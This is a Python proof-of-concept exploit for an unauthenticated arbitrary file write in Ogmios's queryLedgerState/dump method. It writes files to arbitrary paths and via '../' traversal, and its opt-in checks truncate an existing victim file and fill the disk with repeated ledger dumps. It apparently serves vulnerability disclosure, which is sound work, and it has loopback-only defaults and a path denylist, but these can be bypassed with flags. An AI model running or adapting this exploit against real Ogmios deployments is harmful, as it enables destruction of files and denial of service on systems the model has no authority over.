#!/usr/bin/env python3
"""
PoC: Unauthenticated arbitrary file write in Ogmios via `queryLedgerState/dump`.

Target   : Ogmios (CardanoSolutions/ogmios)
Affected : `queryLedgerState/dump` JSON-RPC method
Class    : CWE-73 External Control of File Name or Path
Impact   : unauthenticated create / truncate-overwrite of any file writable by
           the Ogmios process user (root inside the official Docker images)

Verified against:
  - cardanosolutions/ogmios:latest          (nightly 435189ae)
  - ghcr.io/intersectmbo/cardano-node:11.1.3 (preview testnet)

SAFETY RAILS (deliberate)
-------------------------
* Targets loopback only unless you pass --i-understand and --target.
* No scanning, no target discovery, no mass or parallel exploitation.
* Destructive checks (overwrite, disk exhaustion) are opt-in via --destructive
  and refuse a denylist of paths that would turn a demo into an outage.

It also does NOT overstate the bug: the attacker controls the PATH but not the
CONTENT (see NOTES in the README). This is not an RCE primitive.
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import os
import pathlib
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_URL = "http://127.0.0.1:1337/"

DENYLIST = (
    "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/sudoers",
    "/etc/crontab", "/boot", "/dev", "/proc", "/sys", "/",
)


def die(msg: str, code: int = 1) -> "NoReturn":  # noqa: F821
    print(f"[!] {msg}", file=sys.stderr)
    raise SystemExit(code)


def info(msg: str) -> None:
    print(f"[*] {msg}")


def ok(msg: str) -> None:
    print(f"[+] {msg}")


def warn(msg: str) -> None:
    print(f"[!] {msg}")


def is_loopback(url: str) -> bool:
    host = urllib.parse.urlparse(url).hostname
    if host == "localhost":
        return True
    try:
        return ipaddress.ip_address(host or "").is_loopback
    except ValueError:
        return False


def rpc(url: str, method: str, params: dict, timeout: int = 300) -> tuple[int, object]:
    """Send one JSON-RPC request. Returns (http_status, parsed_or_raw_body)."""
    body = json.dumps(
        {"jsonrpc": "2.0", "id": "poc", "method": method, "params": params}
    ).encode()
    req = urllib.request.Request(
        url, data=body, headers={"Content-Type": "application/json"}
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw, status = resp.read(), resp.status
    except urllib.error.HTTPError as e:
        raw, status = e.read(), e.code
    except urllib.error.URLError as e:
        die(f"cannot reach {url}: {e.reason}")
    try:
        return status, json.loads(raw)
    except json.JSONDecodeError:
        return status, raw[:200]


def accepted(body: object) -> bool:
    """dump answers {"result": null} on success; anything else is an error."""
    return isinstance(body, dict) and "error" not in body


class Resolver:
    """Maps a path as Ogmios sees it (container namespace) to our local view.

    `container_root` is --outdir as Ogmios sees it (e.g. /evidence).
    `host_root`     is where that directory lives on this host, if the caller
                    told us (e.g. /tmp/x/evidence). None => no mapping.
    """

    def __init__(self, container_root: pathlib.Path, host_root: str | None):
        self.container_root = container_root
        self.host_root = pathlib.Path(host_root) if host_root else None

    def local(self, ogmios_path: pathlib.Path) -> pathlib.Path:
        if self.host_root is None:
            return ogmios_path
        try:
            rel = ogmios_path.relative_to(self.container_root)
        except ValueError:
            # Outside the evidence mount (e.g. traversal target): cannot map.
            return ogmios_path
        return self.host_root / rel

    def report(self, ogmios_path: pathlib.Path) -> str:
        local = self.local(ogmios_path)
        if self.host_root is not None and local == ogmios_path:
            return (
                f"{ogmios_path} (outside the evidence mount; verify in-container, "
                f"e.g. `docker exec <c> ls -la {ogmios_path}`)"
            )
        return str(local)


# ---------------------------------------------------------------- checks


def check_reachability(url: str) -> None:
    info(f"probing {url}")
    status, body = rpc(url, "queryLedgerState/epoch", {}, timeout=30)
    if isinstance(body, dict) and body.get("result") is not None:
        ok(f"target is a live Ogmios (epoch={body['result']}, HTTP {status})")
    else:
        die(f"target does not look like Ogmios (HTTP {status}): {body!r}")


def check_unauthenticated(url: str) -> None:
    info("confirming no credential of any kind is required (we send none)")
    status, body = rpc(url, "queryLedgerState/tip", {}, timeout=30)
    if isinstance(body, dict) and body.get("result") is not None:
        ok("unauthenticated query succeeded -> the write path is likewise open")
    else:
        warn(f"query failed: {body!r}")


def check_arbitrary_path(url: str, r: Resolver, outdir: pathlib.Path) -> None:
    info("arbitrary absolute path: writing to a caller-chosen location")
    target = outdir / "poc_arbitrary_path.bin"
    status, body = rpc(url, "queryLedgerState/dump", {"to": str(target)}, timeout=300)
    if not accepted(body):
        warn(f"Ogmios rejected the write (HTTP {status}): {body!r}")
        return
    local = r.local(target)
    if local.exists():
        ok(f"ARBITRARY PATH WRITE CONFIRMED -> {local} ({local.stat().st_size:,} bytes)")
    else:
        ok(f"server accepted the write to {target} (not visible locally)")


def check_path_traversal(url: str, r: Resolver, outdir: pathlib.Path) -> None:
    info("path traversal: writing OUTSIDE the intended directory via '../'")
    # Relative paths resolve against Ogmios's CWD, not --outdir.
    traversal = "../poc_traversal_escaped.bin"
    status, body = rpc(url, "queryLedgerState/dump", {"to": traversal}, timeout=300)
    if accepted(body):
        ok(
            "TRAVERSAL CONFIRMED -> Ogmios resolved a relative path against its "
            f"CWD and wrote {traversal!r}"
        )
        warn(
            "verify in-container, e.g.: docker exec <container> "
            "find / -maxdepth 2 -name poc_traversal_escaped.bin"
        )
    else:
        warn(f"traversal rejected (HTTP {status}): {body!r}")


def check_overwrite(url: str, r: Resolver, victim: pathlib.Path) -> None:
    """DESTRUCTIVE: truncates an existing file. Opt-in only."""
    local = r.local(victim)
    if not local.exists():
        warn(f"{local} does not exist locally; skipping overwrite check")
        return
    before = local.read_bytes()
    info(f"overwriting existing {victim} ({len(before)} bytes) - DESTRUCTIVE")
    status, _ = rpc(url, "queryLedgerState/dump", {"to": str(victim)}, timeout=300)
    after = local.read_bytes()
    if after != before:
        ok(f"OVERWRITE CONFIRMED -> {local}: {len(before):,} -> {len(after):,} bytes")
    else:
        warn("file unchanged; overwrite not confirmed")


def check_disk_exhaustion(url: str, r: Resolver, outdir: pathlib.Path, count: int) -> None:
    """Writes N ledger dumps to show there is no quota and no dedup."""
    info(f"disk exhaustion: writing {count} full ledger dumps (no quota/dedup)")
    total = 0
    for i in range(count):
        t = outdir / f"dump_{i:03d}.cbor"
        start = time.time()
        rpc(url, "queryLedgerState/dump", {"to": str(t)}, timeout=300)
        local = r.local(t)
        if local.exists():
            size = local.stat().st_size
            total += size
            print(f"      [{i + 1}/{count}] {t.name}: {size:,} bytes ({time.time() - start:.1f}s)")
    ok(f"wrote {total:,} bytes across {count} unauthenticated requests")
    if total == 0:
        warn(
            "No files were produced. Ogmios cannot create directories, so the\n"
            "      dump target directory must already exist on Ogmios's side:\n"
            f"        docker exec <container> mkdir -p {outdir}\n"
            "      (On a bare-metal install, just mkdir it locally.)"
        )
    warn("each dump is the full NewEpochState; on mainnet these are multi-GB")


def check_content_control(url: str, r: Resolver, outdir: pathlib.Path) -> None:
    """Demonstrate the LIMIT: content is node CBOR, not attacker-chosen."""
    info("content-control check (shows the limitation, not a bypass)")
    a = outdir / "content_a.bin"
    b = outdir / "content_b.bin"
    rpc(url, "queryLedgerState/dump", {"to": str(a)}, timeout=300)
    time.sleep(2)  # let the tip move so state differs
    rpc(url, "queryLedgerState/dump", {"to": str(b)}, timeout=300)
    la, lb = r.local(a), r.local(b)
    if la.exists() and lb.exists():
        head = la.read_bytes()[:8]
        info(f"first bytes written: {head.hex()}")
        info(
            "These are the node's CBOR NewEpochState, not attacker bytes. "
            "Path is controlled; content is NOT."
        )


# ---------------------------------------------------------------- main


def main() -> None:
    p = argparse.ArgumentParser(
        description="Ogmios queryLedgerState/dump arbitrary file write PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--target", default=DEFAULT_URL, help=f"Ogmios URL (default {DEFAULT_URL})")
    p.add_argument(
        "--outdir",
        default="/tmp/ogmios_poc_evidence",
        help=(
            "Evidence directory, resolved BY THE OGMIOS PROCESS. Default works "
            "for bare-metal installs. If Ogmios is containerised, pass the "
            "in-container path of a mounted dir (e.g. /evidence)."
        ),
    )
    p.add_argument(
        "--host-prefix",
        default=None,
        help="Host path where --outdir is mounted, so evidence can be verified locally.",
    )
    p.add_argument(
        "--i-understand",
        action="store_true",
        help="required when --target is not loopback",
    )
    p.add_argument(
        "--destructive",
        action="store_true",
        help="also run overwrite + disk-exhaustion checks (destructive)",
    )
    p.add_argument("--victim", default=None, help="existing file to overwrite (implies --destructive)")
    p.add_argument("--count", type=int, default=5, help="dumps for the disk-exhaustion check")
    args = p.parse_args()

    url = args.target if args.target.endswith("/") else args.target + "/"

    print("=" * 72)
    print(" Ogmios `queryLedgerState/dump` arbitrary file write - PoC")
    print(" CWE-73 | unauthenticated | PATH control, NOT content control")
    print("=" * 72)

    if not is_loopback(url) and not args.i_understand:
        die(
            f"refusing to target non-loopback host {url!r}.\n"
            "    This PoC only runs against localhost by default.\n"
            "    If you own this host and are authorized, re-run with --i-understand."
        )

    if args.victim:
        v = str(pathlib.Path(args.victim))
        if any(v == d or v.startswith(d + "/") for d in DENYLIST):
            die(f"refusing to clobber denylisted path: {v}")
        args.destructive = True

    outdir = pathlib.Path(args.outdir)
    r = Resolver(outdir, args.host_prefix)

    check_reachability(url)
    check_unauthenticated(url)
    check_arbitrary_path(url, r, outdir)
    check_path_traversal(url, r, outdir)
    check_content_control(url, r, outdir)

    if args.destructive:
        if args.victim:
            check_overwrite(url, r, pathlib.Path(args.victim))
        check_disk_exhaustion(url, r, outdir / "dumps", args.count)
    else:
        info("skipping overwrite/disk-exhaustion (pass --destructive to run)")

    print("=" * 72)
    ok("PoC complete.")
    print("  Evidence target (as Ogmios sees it):", outdir)
    print("  See README.md for remediation and impact analysis.")
    print("=" * 72)


if __name__ == "__main__":
    main()